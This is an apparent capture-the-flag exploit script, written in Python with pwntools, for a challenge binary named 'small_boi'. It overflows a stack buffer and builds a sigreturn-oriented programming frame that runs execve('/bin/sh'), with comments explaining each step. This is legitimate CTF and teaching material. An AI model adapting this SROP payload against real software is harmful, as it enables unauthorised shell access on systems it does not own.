import pwn
import struct

# small_boi is a 64-bit statically-linked binary
# NX is enabled, ASLR is turned on

# There is a basic buffer overflow, which allows us to change the return address after 40 bytes of input
# However, the problem is the binary is so small, and statically linked, that it is hard to find stuff to execute
# Luckily, there is function that makes a sigreturn syscall conveniently placed in the binary
# We can call this function and put a custom sigreturn frame on the stack which will be an execve /bin/sh syscall

target = pwn.process("./small_boi")

pwn.context.arch = "amd64"

# 0x0f in rax is a sigreturn syscall
# The function at 0x40017c makes such a syscall
# The address of the instruction right before the syscall (mov eax, 0xf) is 0x400180
sigreturn_call_addr = struct.pack("<Q", 0x400180)

# The sigreturn syscall will use what is on the top of the stack as its sigreturn frame
frame = pwn.SigreturnFrame()
frame.rip = 0x400185 # address of syscall instruction
frame.rax = 0x3b # we want to do an execve syscall
frame.rdi = 0x4001ca # address of '/bin/sh' in the binary (very convenient)
frame.rsi = 0x0
frame.rdx = 0x0

payload = b'a' * 40 # offset to return address
payload += sigreturn_call_addr
payload += bytes(frame) # Our sigreturn frame

target.sendline(payload)

target.interactive()